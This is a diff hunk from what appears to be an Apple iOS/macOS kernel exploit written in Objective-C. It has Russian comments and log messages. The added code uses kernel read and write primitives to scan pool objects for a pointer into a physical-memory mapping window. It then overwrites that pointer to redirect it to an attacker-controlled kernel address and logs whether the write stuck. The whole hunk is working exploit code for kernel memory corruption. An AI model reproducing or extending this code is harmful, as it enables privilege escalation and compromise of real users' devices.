@@ -6311,7 +6311,44 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 if (npool198 >= 15) break;
             }
         }
-        int nFld199 = 0, nSkipPM = 0;
+        int nFld199 = 0, nSkipPM = 0, nVHits = 0;
+        // 1.9.201: physmap-указатели проверяем по ЗНАЧЕНИЮ (P≈backKVA) — без единого
+        // контент-чтения (PPL-страница в типе 0x9 walker-гейт не ловит, рулетка
+        // запрещена). backKVA=phystokv(backingPA) уже посчитан выше. Патчим первый,
+        // остальные логируем — если prepare читает другой, следующий билд возьмёт его.
+        for (int pi = 0; pi < npool198 && !vaFldObj; pi++) {
+            uint64_t obj = pools198[pi];
+            if (!kpLooksLikeKernelPointer(obj) || !kpSafeToRead(obj)) continue;
+            for (uint32_t o = 0; o + 8 <= poolSz198[pi] && !vaFldObj; o += 8) {
+                uint64_t P = kp_untag_ptr(early_kread64(obj + o));
+                if (!kpLooksLikeKernelPointer(P)) continue;
+                if (backKVA && P >= backKVA && P < backKVA + 0x4000) {
+                    if (nVHits > 0) {
+                        kpNote(r, [NSString stringWithFormat:@"  [VAD] ещё кандидат окна: pool%d+%#x = %#llx", pi, o, (unsigned long long)P]);
+                    } else {
+                        vaFldObj = obj; vaFldOff = o; vaFldOld = P;
+                        kpNote(r, [NSString stringWithFormat:@"  [VAD] ★ VA-поле буфера (ЗНАЧЕНИЕ): pool%d+%#x = %#llx == backKVA окно — подмена на ctlKVA %#llx",
+                                  pi, o, (unsigned long long)P, (unsigned long long)ctlKVA]);
+                        early_kwrite64(obj + o, ctlKVA + (P - backKVA));
+                        uint64_t rb3 = early_kread64(obj + o);
+                        kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb3,
+                                  rb3 == ctlKVA + (P - backKVA) ? @"ПРИЛИПЛО" : @"МИМО"]);
+                    }
+                    nVHits++;
+                }
+            }
+        }
+        // + второй уровень: pointees rangeObj (поле может жить глубже)
+        if (!vaFldObj && npool198 > 1 && kpLooksLikeKernelPointer(pools198[1])) {
+            for (uint32_t o = 0; o + 8 <= 0x100 && npool198 < 16; o += 8) {
+                uint64_t Q = kp_untag_ptr(early_kread64(pools198[1] + o));
+                if (!kpLooksLikeKernelPointer(Q)) continue;
+                BOOL dup = NO;
+                for (int j = 0; j < npool198; j++) if (pools198[j] == Q) { dup = YES; break; }
+                if (dup) continue;
+                pools198[npool198] = Q; poolSz198[npool198] = 0x100; npool198++;
+            }
+        }
         for (int pi = 0; pi < npool198 && !vaFldObj; pi++) {
             uint64_t obj = pools198[pi];
             if (!kpLooksLikeKernelPointer(obj) || !kpSafeToRead(obj)) continue;
